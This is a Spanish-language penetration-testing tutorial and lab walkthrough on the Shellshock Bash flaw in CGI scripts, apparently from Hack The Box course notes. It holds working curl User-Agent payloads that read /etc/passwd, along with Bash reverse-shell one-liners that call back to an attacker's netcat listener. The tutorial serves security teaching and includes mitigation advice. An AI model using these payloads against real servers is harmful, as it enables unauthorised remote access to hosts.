
# Ataques a CGI - Shellshock

Una [interfaz de puerta de enlace común (CGI)](https://www.w3.org/CGI/) se utiliza para ayudar a un servidor web a representar páginas dinámicas y crear una respuesta personalizada para el usuario que realiza una solicitud a través de una aplicación web. Las aplicaciones CGI se utilizan principalmente para acceder a otras aplicaciones que se ejecutan en un servidor web. CGI es esencialmente un middleware entre servidores web, bases de datos externas y fuentes de información.&#x20;

Los scripts y programas CGI se guardan en el directorio `/CGI-bin` de un servidor web y se pueden escribir en C, C++, Java, PERL, etc. Los scripts CGI se ejecutan en el contexto de seguridad del servidor web. A menudo se utilizan para libros de visitas, formularios (como correo electrónico, comentarios, registro), listas de correo, blogs, etc. Estos scripts son independientes del lenguaje y se pueden escribir de forma muy sencilla para realizar tareas avanzadas mucho más fáciles que escribirlas utilizando lenguajes de programación del lado del servidor.

Los scripts/aplicaciones CGI se utilizan normalmente por algunas razones:

* Si el servidor web debe interactuar dinámicamente con el usuario
* Cuando un usuario envía datos al servidor web al completar un formulario, la aplicación CGI procesará los datos y devolverá el resultado al usuario a través del servidor web.

A continuación se puede ver una representación gráfica de cómo funciona CGI.

![imagen](https://academy.hackthebox.com/storage/modules/113/cgi.gif)

En términos generales, los pasos son los siguientes:

* Se crea un directorio en el servidor web que contiene los scripts/aplicaciones CGI. Este directorio normalmente se denomina `CGI-bin`.
* El usuario de la aplicación web envía una solicitud al servidor a través de una URL, es decir, <https://acme.com/cgi-bin/newchiscript.pl>
* El servidor ejecuta el script y pasa el resultado al cliente web.

Existen algunas desventajas en su uso: el programa CGI inicia un nuevo proceso para cada solicitud HTTP, lo que puede ocupar mucha memoria del servidor. Cada vez se abre una nueva conexión a la base de datos. Los datos no se pueden almacenar en caché entre cargas de páginas, lo que reduce la eficiencia. Sin embargo, los riesgos y las ineficiencias superan los beneficios, y CGI no se ha mantenido al día con los tiempos y no ha evolucionado para funcionar bien con las aplicaciones web modernas. Ha sido reemplazado por tecnologías más rápidas y seguras. Sin embargo, como pentesters, nos encontraremos de vez en cuando con aplicaciones web que aún usan CGI y, a menudo, lo veremos cuando nos encontremos con dispositivos integrados durante una evaluación.

***

## <mark style="color:purple;">Ataques CGI</mark>

Quizás el ataque CGI más conocido es el que explota la vulnerabilidad Shellshock (también conocida como "error de Bash") a través de CGI. La vulnerabilidad Shellshock ( [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) ) se descubrió en 2014, es relativamente fácil de explotar y todavía se puede encontrar en la red (durante pruebas de penetración) de vez en cuando. Es un fallo de seguridad en el shell Bash (GNU Bash hasta la versión 4.3) que se puede utilizar para ejecutar comandos no intencionados utilizando variables de entorno. En el momento del descubrimiento, era un error de 25 años de antigüedad y una amenaza importante para las empresas de todo el mundo.

***

## <mark style="color:purple;">Shellshock a través de CGI</mark>

La vulnerabilidad Shellshock permite a un atacante explotar versiones antiguas de Bash que guardan variables de entorno de forma incorrecta. Normalmente, al guardar una función como variable, la función de shell se detiene donde el creador la define. Las versiones vulnerables de Bash permiten a un atacante ejecutar comandos del sistema operativo que se incluyen después de una función almacenada dentro de una variable de entorno. Veamos un ejemplo sencillo en el que definimos una variable de entorno e incluimos un comando malicioso después.

```shell-session
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

Cuando se asigna la variable anterior, Bash interpretará la parte `y='() { :;};'` como una definición de función para una variable `y`. La función no hace nada más que devolver un código de salida `0`, pero cuando se importa, ejecutará el comando `echo vulnerable-shellshock` si la versión de Bash es vulnerable. Este (o cualquier otro comando, como un comando one-liner de reverse-shell) se ejecutará en el contexto del usuario del servidor web. La mayoría de las veces, este será un usuario como `www-data`, y tendremos acceso al sistema, pero aún necesitaremos escalar privilegios. Ocasionalmente, tendremos mucha suerte y obtendremos acceso como el usuario `root` si el servidor web se ejecuta en un contexto elevado.

Si el sistema no es vulnerable, solo se imprimirá `"not vulnerable"`.

```shell-session
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable
```

Este comportamiento ya no ocurre en un sistema parcheado, ya que Bash no ejecutará código después de importar una definición de función. Además, Bash ya no interpretará `y=() {...}`como una definición de función. En su lugar, las definiciones de función dentro de las variables de entorno ahora deben tener el prefijo `BASH_FUNC_`.

***

## <mark style="color:purple;">Ejemplo práctico</mark>

Veamos un ejemplo práctico para ver cómo nosotros, como pentesters, podemos encontrar y explotar esta falla.

### **Enumeración - Gobuster**

Podemos buscar scripts CGI usando una herramienta como `Gobuster`. Aquí encontramos uno, `access.cgi`.

```shell-session
afsh4ck@hkali$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
                                             
===============================================================
2023/03/23 09:26:29 Finished

```

A continuación, podemos ejecutar cURL en el script y observar que no se nos muestra nada, por lo que quizás sea un script inactivo, pero aún así vale la pena explorarlo más a fondo.

```shell-session
afsh4ck@kali$ curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

### **Confirmando la vulnerabilidad**

Para comprobar la vulnerabilidad, podemos utilizar un `cURL`comando sencillo o utilizar Burp Suite Repeater o Intruder para fuzzear el campo user-agent. Aquí podemos ver que `/etc/passwd`se nos devuelve el contenido del archivo, lo que confirma la vulnerabilidad a través del campo user-agent.

```shell-session
afsh4ck@kali$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

### **Explotación para el acceso a Shell**

Una vez confirmada la vulnerabilidad, podemos obtener acceso al reverse shell de muchas maneras. En este ejemplo, utilizamos una línea de comandos Bash simple y obtenemos una devolución de llamada en nuestro listener Netcat:

```shell-session
afsh4ck@kali$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

Desde aquí, podríamos empezar a buscar datos confidenciales o intentar aumentar los privilegios. Durante una prueba de penetración de la red, podríamos intentar usar este host para adentrarnos más en la red interna.

```shell-session
afsh4ck@kali$ sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$
```

***

## <mark style="color:purple;">Mitigación</mark>

Esta [entrada del blog](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contiene consejos útiles para mitigar la vulnerabilidad de Shellshock. La forma más rápida de solucionar la vulnerabilidad es actualizar la versión de Bash en el sistema afectado. Esto puede ser más complicado en sistemas Ubuntu/Debian que están al final de su vida útil, por lo que un administrador de sistemas puede tener que actualizar primero el administrador de paquetes. Con ciertos sistemas (es decir, dispositivos IoT que usan CGI), la actualización puede no ser posible. En estos casos, sería mejor primero asegurarse de que el sistema no esté expuesto a Internet y luego evaluar si el host puede ser desmantelado. Si es un host crítico y la organización decide aceptar el riesgo, una solución temporal podría ser bloquear el host con un firewall en la red interna lo mejor posible. Tenga en cuenta que esto es solo poner una tirita en una herida grande y la mejor medida de acción sería actualizar o desconectar el host.

***

## <mark style="color:purple;">Reflexiones finales</mark>

Shellshock es una vulnerabilidad heredada que ya tiene casi una década. Pero el hecho de que sea antigua no significa que no nos la encontremos de vez en cuando. Si durante sus evaluaciones encuentra alguna aplicación web que utilice scripts CGI (especialmente dispositivos IoT), definitivamente vale la pena investigar siguiendo los pasos que se muestran en esta sección. ¡Puede que tenga un punto de apoyo relativamente simple esperándolo!

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.205.27
```

> Enumera el host, explota la vulnerabilidad de Shellshock y envía el contenido del archivo flag.txt ubicado en el servidor.

### Enumeración

```bash
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.205.27/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
Progress: 1918 / 1920 (99.90%)
===============================================================
Finished
===============================================================
```

Encontramos un script CGI: `access.cgi`

### Confirmación de la vulnerabilidad

Con un curl vemos que es vulnerable y podemos leer archivos del servidor como `/etc/passwd`:

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

### Explotación

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.127/4444 0>&1' http://10.129.205.27/cgi-bin/access.cgi
```

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.127] from (UNKNOWN) [10.129.205.27] 46364
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tenemos una shell! Enumeramos el directorio actual y encontramos la flag:

```bash
www-data@htb:/usr/lib/cgi-bin$ ls
ls
access.cgi
flag.txt
www-data@htb:/usr/lib/cgi-bin$ cat flag.txt
cat flag.txt
Sh3ll_**************
```
